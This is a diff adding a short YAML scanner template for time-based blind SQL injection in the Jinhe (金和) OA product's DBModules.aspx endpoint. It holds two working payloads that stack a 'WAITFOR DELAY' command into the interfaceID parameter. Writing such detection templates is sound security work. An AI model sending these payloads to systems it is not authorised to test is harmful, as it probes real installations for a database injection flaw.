@@ -1,0 +1,17 @@
+name: 金和OA-DBModules-sql
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 5
+matchCount: 2
+rules:
+  - method: GET
+    path: /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=123;WAITFOR+DELAY+'0:0:3'--
+    expression:
+      status: 200
+      sleep: 3
+  - method: GET
+    path: /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=123;WAITFOR+DELAY+'0:0:4'--
+    expression:
+      status: 200
+      sleep: 4
